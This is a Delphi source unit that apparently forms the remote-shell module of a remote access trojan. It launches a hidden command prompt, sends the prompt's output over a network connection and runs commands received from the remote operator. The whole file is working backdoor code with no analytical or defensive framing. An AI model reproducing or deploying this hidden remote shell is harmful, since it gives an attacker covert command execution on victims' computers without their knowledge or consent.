unit UnitShell;

interface

uses
  Windows, UnitVariables, UnitConstants, UnitConnection;

var
  ShellCmd: string;

procedure ShellThread;

implementation
    
procedure ShellThread;
var
  Buffer: array [0..32768] of Byte;
  SecurityAttributes: SECURITY_ATTRIBUTES;
  hiRead, hiWrite, hoRead, hoWrite: THandle;
  StartupInfo: TSTARTUPINFO;
  ProcessInfo: TProcessInformation;
  BytesRead, BytesWritten, ExitCode, PipeMode: DWORD;
  ComSpec: array [0..MAX_PATH] of Char;
  TmpHandle: THandle;
  TmpStr: string;
  i: Integer;
begin
  SendDatas(MainConnection, SHELL  + '|' + SHELLSTART + '|');

  SecurityAttributes.nLength := SizeOf(SECURITY_ATTRIBUTES);
  SecurityAttributes.lpSecurityDescriptor := nil;
  SecurityAttributes.bInheritHandle := True;
  CreatePipe(hiRead, hiWrite, @SecurityAttributes, 0);
  CreatePipe(hoRead, hoWrite, @SecurityAttributes, 0);
  GetStartupInfo(StartupInfo);
  StartupInfo.hStdOutput := hoWrite;
  StartupInfo.hStdError := hoWrite;
  StartupInfo.hStdInput := hiRead;
  StartupInfo.dwFlags := STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES;
  StartupInfo.wShowWindow := SW_HIDE;
  GetEnvironmentVariable('COMSPEC', ComSpec, sizeof(ComSpec));
  CreateProcess(nil, ComSpec, nil, nil, True, CREATE_NEW_CONSOLE, nil, nil, StartupInfo, ProcessInfo);
  CloseHandle(hoWrite);
  CloseHandle(hiRead);
  PipeMode := PIPE_NOWAIT;
  SetNamedPipeHandleState(hoRead, PipeMode , nil, nil);

  while True do
  begin
    Sleep(10);
    GetExitCodeProcess(ProcessInfo.hProcess, ExitCode);
    if ExitCode <> STILL_ACTIVE then Break;
    ReadFile(hoRead, Buffer, 4096, BytesRead, nil);
    
    if BytesRead > 0 then
      for i := 0 to BytesRead-1 do TmpStr := TmpStr + string(Char(Buffer[i]))
    else
    begin
      if TmpStr <> '' then
      begin
        try SendDatas(MainConnection, SHELL + '|' + SHELLDATAS + '|' + TmpStr);
        except Break;
        end;

        TmpStr := '';
      end;
    end;

    if ShellCmd <> '' then
    begin
      WriteFile(hiWrite, Pointer(ShellCmd)^, Length(ShellCmd), BytesWritten, nil);
      WriteFile(hiWrite, #13#10, 2, BytesWritten, nil);
      ShellCmd := '';
    end;
  end;

  GetExitCodeProcess(ProcessInfo.hProcess, ExitCode);
  if ExitCode <> STILL_ACTIVE then TerminateProcess(ProcessInfo.hProcess, 0);
  CloseHandle(hoRead);
  CloseHandle(hiWrite);

  SendDatas(MainConnection, SHELL  + '|' + SHELLSTOP + '|');
end;

end.
